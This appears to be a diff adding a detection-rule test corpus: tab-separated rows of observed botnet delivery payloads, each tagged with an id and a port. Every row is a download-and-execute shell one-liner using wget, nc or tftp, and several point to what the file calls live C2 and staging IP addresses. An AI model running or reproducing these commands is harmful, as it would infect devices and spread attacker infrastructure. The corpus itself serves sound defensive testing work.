@@ -1,0 +1,29 @@
+# Real delivery payloads, for measuring rule coverage.
+#
+# Every line here was observed - either captured on the wire by this grid, or
+# recovered from a dropper served by a staging host. None of it is synthetic.
+# This is the corpus tests/coverage.py measures the rules against.
+#
+# Adding a payload here is how a new observation becomes a regression test.
+# If a rule change drops coverage of a line that used to match, that is a
+# regression regardless of how the rule reads.
+#
+# Columns: id <TAB> port <TAB> payload
+# port 0 = payload seen in a dropper rather than in a captured datagram, so
+# no destination port applies and port-scoped rules are not credited.
+#
+# These are live IOCs (C2 and staging addresses). Private repo only.
+
+geico-easydisc-wire	43562	'&wget http://g6.wtf/ge -O-|sh&'al3
+geico-ge-dropper	0	cd /tmp;rm aarch64;wget http://160.119.71.134/n2/aarch64;chmod 777 aarch64;./aarch64 geico;rm aarch64
+geico-ppppl3-nc	0	echo|nc 160.119.71.134 7003 > a$$;chmod 777 a$$;./a$$
+geico-victoria-drop	0	cd /tmp;rm m68k;wget http://160.119.71.134/n2/m68k;chmod 777 m68k;./m68k victoria;rm m68k
+rondodox-naz-9999	9999	wget -qO- http://194.26.192.87/rondo.``naz.sh|sh&
+rondodox-qpu-ike	500	wget -qO- http://194.26.192.87/rondo.``qpu.sh|sh&
+realtek-selfrep-wire	9034	orf; cd /tmp; rm -rf mipsel; /bin/busybox wget http://58.211.144.243:800/mipsel; chmod +x mipsel; ./mipsel realtek.selfrep; #
+kataru-realtek	9034	orf; cd /tmp; /bin/busybox wget http://188.165.84.165:8081/188.165.84.165; chmod 777 188.165.84.165; ./188.165.84.165 selfrep.realtek
+cling-dropper	0	wget http://118.145.196.225:800/mipsel; chmod 777 mipsel; ./mipsel $group;
+familye-binssh	0	cd /tmp; wget http://198.51.100.9/bins.sh; sh bins.sh
+familye-inject	0	wget http://198.51.100.9/bins.sh -O bins.sh; chmod +x bins.sh; ./bins.sh
+tftp-generic	9034	cd /tmp; tftp -g -r mipsel 198.51.100.11; chmod 777 mipsel; ./mipsel
+tftp-busybox	9034	/bin/busybox tftp -r mipsel -g 198.51.100.11; chmod 777 mipsel
